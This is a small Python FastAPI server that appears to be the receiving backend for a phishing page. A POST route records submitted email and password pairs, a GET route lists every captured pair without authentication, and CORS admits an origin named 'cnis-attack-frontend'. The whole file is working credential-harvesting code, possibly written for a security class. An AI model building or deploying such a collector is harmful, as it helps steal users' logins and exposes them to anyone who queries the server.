from fastapi import FastAPI
from fastapi.responses import HTMLResponse

from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

origins = [
    "https://cnis-attack-frontend.vercel.app/"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,            # List of allowed origins
    allow_credentials=True,           # Allow cookies/authentication headers
    allow_methods=["*"],               # Allow all HTTP methods (GET, POST, etc.)
    allow_headers=["*"],               # Allow all headers
)

cache = {}


def set_data(key, value):

    cache[key] = value

def get_data():
    return cache

@app.post("/{email}/{password}")
def log(email:str , password:str):


    set_data(email, password)

    return;

@app.get("/")
def get_all_data():
    return get_data()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=5001, reload=True)
